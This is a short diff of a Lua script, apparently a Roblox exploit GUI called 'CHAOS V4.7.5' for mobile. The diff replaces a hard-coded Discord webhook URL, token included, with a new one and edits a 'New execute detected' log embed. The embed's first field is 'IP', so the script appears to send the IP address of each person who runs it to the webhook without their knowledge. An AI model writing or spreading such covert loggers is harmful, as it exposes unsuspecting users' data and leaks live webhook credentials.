@@ -44,13 +44,13 @@ function SendMessageEMBED(url, embed)
     })
 end
 
-local url = "https://discord.com/api/webhooks/1266030805826670676/Ar-PF-H6nvcYGR_BZobUfJuLPVm_2D_syCLJ9UOWsxip0whsJIwWIoDW_mgiBClImi4H"
+local url = "https://discord.com/api/webhooks/1268974600205631601/KRhrT3z7j9Ikr5JXs3RgPst3G1lHEi1jU2Rmbbdc7LBibsdjZXrkri9B6GtRujPSlbCc"
 SendMessage(url)
 
 local embed = {
-	["title"] = "CHAOS V4.7.5 Logs:",
+	["title"] = "CHAOS V4.7.5 (MOB GUI)",
 	["description"] = "New execute detected on CHAOS V4.7.5 (MOBILE)",
-	["color"] = 0,
+	["color"] = 16711680,
 	["fields"] = {
 		{
 			["name"] = "IP",
